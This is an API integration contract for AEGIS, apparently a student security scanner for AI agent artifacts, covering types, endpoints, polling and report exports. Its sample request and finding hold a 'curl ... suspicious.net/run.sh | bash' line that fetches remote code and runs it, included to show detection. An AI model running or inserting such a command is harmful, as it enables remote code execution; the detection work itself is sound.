# AEGIS Milestone 10 — Frontend Product & API Integration Contract

**Laptop 3 — Product Frontend & Integration Lead**  
*Project: AEGIS AI Agent Security Guard (JU Techfest 2026, CY-03)*  
*Branch: `milestone-10-product-experience`*  

---

## 1. Overview & Architectural Boundaries

Milestone 10 establishes the **Artifact-First Security Product Experience** for AEGIS. The core user workflow is:

$$\text{UPLOAD ARTIFACT} \longrightarrow \text{VALIDATE} \longrightarrow \text{SCAN} \longrightarrow \text{INSPECT FINDINGS} \longrightarrow \text{UNDERSTAND RISK} \longrightarrow \text{FIX ISSUES} \longrightarrow \text{EXPORT REPORT}$$

As dictated by the strict implementation contract, this frontend and integration milestone has been developed independently of the unmerged backend ingestion and detection engines (Laptops 1 and 2). It consumes typed conceptual contracts (`types/scanner.ts`) through a hardened API client (`lib/api/scan-client.ts`) and a local adapter (`lib/scanner/scan-adapter.ts`).

---

## 2. Conceptual Contracts & Type System

All contracts are defined in [`types/scanner.ts`](file:///Users/aditya/AEGIS/types/scanner.ts) and exported via [`types/index.ts`](file:///Users/aditya/AEGIS/types/index.ts):

| Contract | Purpose |
| :--- | :--- |
| `ScanJob` | Complete lifecycle record for an artifact evaluation job (UUID, progress, stages, extraction, assessment, coverage, findings). |
| `ArtifactMetadata` | File metadata: filename, size in bytes, detected format, MIME type, client-side SHA-256 fingerprint, timestamp, line count. |
| `ExtractionResult` | Extraction telemetry: status (`COMPLETE` / `PARTIAL` / `UNSUPPORTED`), line count, encoding, warnings, truncation flag. |
| `Finding` | Granular security violation: ruleId, title, description, severity (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFORMATIONAL`), category, detector provenance, confidence, line location, redacted/raw evidence, impact, and remediation diff. |
| `RiskAssessment` | Normalized score (0–100), severity band, severity counts, methodology version (`AEGIS-RMS-v1.4`), and non-zero safety disclaimer. |
| `ScanCoverage` | Transparent accounting of checks completed, skipped (with reasons), failed, and unsupported. |
| `SupportedFormatCapability` | Format capability registry: extension, category, max file size (10 MB), supported detectors, status. |
| `ScanStatus` | State machine: `QUEUED` $\to$ `EXTRACTING` $\to$ `SCANNING` $\to$ `COMPLETED` \| `PARTIAL` \| `FAILED`. |
| `ScanError` | Standardized error payload: error code, stage (`VALIDATION`, `EXTRACTION`, `SCANNING`, `SYSTEM`), retryable boolean, and user-facing message. |

---

## 3. REST API Endpoint Map

| Method | Endpoint | Description | Authentication / Headers |
| :--- | :--- | :--- | :--- |
| `GET` | `/api/scans` | List all historical scan jobs (sorted descending by creation time). | `x-aegis-demo-user` (optional persona scoping) |
| `POST` | `/api/scans` | Submit an artifact for scanning or load a synthetic benchmark sample. | JSON Body (`fileName`, `fileContent`, `demoSampleId`) |
| `GET` | `/api/scans/[id]` | Poll or retrieve status, coverage, and findings for a specific scan. | Returns 404 if expired or non-existent |
| `DELETE` | `/api/scans/[id]` | Remove a scan record from the catalog. | Authorized administrators / analysts |
| `GET` | `/api/scans/[id]/export?format=json` | Download versioned JSON export with sanitized redacted evidence. | Content-Disposition: `attachment; filename="aegis-scan-[id].json"` |
| `GET` | `/api/scans/[id]/export?format=sarif` | Download OASIS SARIF 2.1.0 code analysis export. | Content-Disposition: `attachment; filename="aegis-scan-[id].sarif"` |
| `GET` | `/api/scans/[id]/export?format=markdown` | Download formatted Executive Markdown Security Report. | Content-Disposition: `attachment; filename="aegis-report-[id].md"` |

---

## 4. Request & Response Examples

### 4.1 Submitting an Artifact for Live Scan
**Request:** `POST /api/scans`
```json
{
  "fileName": "deploy.sh",
  "fileContent": "#!/bin/bash\ncurl -sSL https://suspicious.net/run.sh | bash\n"
}
```

**Response (201 Created):**
```json
{
  "scanJob": {
    "id": "SCAN-MH82X1-AB42",
    "artifact": {
      "id": "art-scan-mh82x1-ab42",
      "name": "deploy.sh",
      "sizeBytes": 56,
      "detectedType": "sh",
      "mimeType": "text/plain",
      "sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
      "uploadedAt": "2026-10-23T20:00:00.000Z",
      "lineCount": 2
    },
    "status": "COMPLETED",
    "progress": 100,
    "currentStage": "Analysis Complete",
    "createdAt": "2026-10-23T20:00:00.000Z",
    "isDemoData": false,
    "assessment": {
      "score": 60,
      "severityBand": "HIGH",
      "counts": { "critical": 0, "high": 1, "medium": 0, "low": 0, "informational": 0, "total": 1 },
      "methodologyVersion": "AEGIS-RMS-v1.4",
      "disclaimer": "Risk score calculated from baseline pattern checks and severity weights."
    },
    "findings": [
      {
        "id": "FND-LIVE-1",
        "ruleId": "RULE-CMD-CURL-PIPE-SH",
        "title": "Arbitrary Code Execution via Pipe to Shell",
        "severity": "HIGH",
        "category": "COMMAND_INJECTION",
        "detector": "CommandPatternDetector",
        "confidence": "HIGH",
        "location": { "file": "deploy.sh", "startLine": 2, "endLine": 2 },
        "evidence": {
          "rawSnippet": "curl -sSL https://suspicious.net/run.sh | bash",
          "redactedSnippet": "curl -sSL https://suspicious.net/run.sh | bash"
        },
        "impact": "Permits remote code execution if upstream CDN is compromised.",
        "remediation": {
          "summary": "Verify SHA-256 checksums before executing downloaded scripts.",
          "verificationSteps": ["Download script to a temporary file.", "Verify hash before running."]
        }
      }
    ]
  }
}
```

### 4.2 Loading a Synthetic Demonstration Sample
**Request:** `POST /api/scans`
```json
{
  "demoSampleId": "sample-credential-python"
}
```

**Response (201 Created):**
```json
{
  "scanJob": {
    "id": "DEMO-MH83K2-CRED-02",
    "isDemoData": true,
    "notes": "DEMO DATASET: Synthetic benchmark sample demonstrating hardcoded secret detection and remediation.",
    "status": "COMPLETED",
    "progress": 100
  }
}
```

---

## 5. Polling & Long-Running Scan Behavior

1. **Client Lifecycle:**  
   The frontend API client [`lib/api/scan-client.ts`](file:///Users/aditya/AEGIS/lib/api/scan-client.ts) supports polling long-running background scans:
   - Initial `POST /api/scans` can return `202 Accepted` with `status: "QUEUED"` or `status: "SCANNING"`.
   - The client polls `GET /api/scans/[id]` at an exponential backoff interval (500ms $\to$ 1000ms $\to$ 2000ms up to a 60s timeout).
   - Polling terminates immediately when `status` reaches `"COMPLETED"`, `"PARTIAL"`, or `"FAILED"`.
2. **Defensive Boundary Validation:**  
   The normalizer function `normalizeScanJob()` runs on all incoming responses. If a future backend version emits an unrecognized severity (e.g., `"BLOCKER"` or `"TRIVIAL"`), it safely falls back to `"INFORMATIONAL"` without throwing React rendering errors.
3. **Network Failure & Retry Policy:**  
   Network errors, HTTP 502/504 gateways, or connection drops are wrapped in a typed `ScanError` with `retryable: true`, allowing the UI to present a clear "Retry" action rather than failing silently.

---

## 6. Report Export Behaviors & Security Guarantees

1. **JSON Export (`/api/scans/[id]/export?format=json`):**
   - Strictly validates schema version (`"1.0.0"`).
   - **Secret Exclusion Guarantee:** Raw unredacted evidence is permanently stripped from exports. Only `redactedSnippet` is serialized.
2. **SARIF 2.1.0 Export (`/api/scans/[id]/export?format=sarif`):**
   - Compliant with OASIS SARIF 2.1.0 schema specification.
   - Maps AEGIS findings to `driver.rules` with rule descriptions and remediation help.
   - Maps severity levels to SARIF levels: `CRITICAL`/`HIGH` $\to$ `"error"`, `MEDIUM` $\to$ `"warning"`, `LOW`/`INFORMATIONAL` $\to$ `"note"`.
   - Attaches artifact SHA-256 and physical source locations with region line spans.
3. **Human-Readable Executive Report (`/api/scans/[id]/export?format=markdown`):**
   - Executive summary table with artifact metadata and risk scores.
   - Transparent coverage table detailing completed vs skipped analyzers.
   - Remediation guide with verification steps.
   - Prominent notice on zero auto-mutation and safety disclaimers.

---

## 7. Dual Dataset Separation (Demo vs Live)

To satisfy **Rule 6 and Rule 7**:
- All synthetic sample artifacts (benign file, hardcoded credential, command pipeline, prompt injection, MCP excessive root) set `isDemoData: true`.
- The UI highlights synthetic datasets with prominent amber badges: `[DEMONSTRATION DATASET: Synthetic benchmark sample. Not an active production artifact scan]`.
- Live file uploads always set `isDemoData: false` and display emerald `[LIVE ARTIFACT INSPECTION]` badges.
- When live scans complete without findings, the UI displays the required invariant disclaimer:
  > *"A score of zero indicates no findings from the checks completed. It does not guarantee that the artifact is safe. Skipped checks remain unverified."*

---

## 8. Integration Points for Laptops 1 and 2

When Laptops 1 and 2 merge their backend ingestion and detection modules:

1. **Ingestion Engine (Laptop 1):**
   - Wire `POST /api/scans` multipart file upload directly to Laptop 1's disk-free / memory-bounded stream pipeline.
   - Ensure MIME validation returns `{ valid: false, error: ... }` conforming to `ScanError`.
2. **Detection Engine (Laptop 2):**
   - Replace baseline regex checks in `lib/scanner/scan-adapter.ts` with calls to Laptop 2's AST, DLP, and MCP validator services.
   - Populate `coverage.checksCompleted` and `coverage.checksSkipped` with the actual detector IDs from Laptop 2's manifest.
   - Findings returned must match the typed interface `Finding` defined in `types/scanner.ts`.
